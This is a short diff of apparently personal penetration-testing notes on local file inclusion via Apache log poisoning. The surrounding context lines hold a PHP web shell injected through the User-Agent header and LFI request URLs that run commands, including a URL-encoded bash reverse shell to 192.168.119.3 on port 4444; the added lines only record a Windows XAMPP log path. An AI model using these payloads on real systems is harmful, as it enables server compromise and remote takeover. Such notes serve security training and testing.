@@ -7,6 +7,9 @@ http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
 
 2. User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
 http://10.11.0.22/menu.php?file=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
+
+Windows log path:
+C:\xampp\apache\logs\
 ```
 
 ### Null byte to mark the end of file
